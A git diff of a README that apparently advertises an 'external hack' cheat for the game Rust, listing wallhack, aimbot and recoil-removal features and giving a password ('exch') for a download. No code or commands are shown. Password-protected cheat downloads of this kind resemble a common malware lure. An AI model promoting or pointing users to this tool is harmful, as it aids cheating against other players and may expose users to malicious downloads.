@@ -1,6 +1,6 @@
 # EXTERNAL HACK FOR RUST
 ![532523](https://github.com/EugeneWalk244/release-eugenewalk/assets/163557982/a143f67c-9d47-42bb-86d5-ebdaea2690ec) 
-> Password for zip-file: exch
+> Password: exch
 
 ![1111](https://github.com/EugeneWalk244/release-eugenewalk/assets/163557982/922381e0-53c9-4314-b13f-4b0e805f4e8a)
 
@@ -9,7 +9,7 @@
 
 ---
 
-### Freatures 🛠️:
+<H2 align=center>Freatures 🛠️:
 - ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
 - AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
 - Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
@@ -21,7 +21,7 @@
 
 ---
 
-### Screenshots 📖 :
+<H2 align=center>Screenshots 📖 :
 
 ![412324](https://github.com/EugeneWalk244/release-eugenewalk/assets/163557982/f20d2ac4-cece-4c07-9c3f-a9e924e5908a)
 
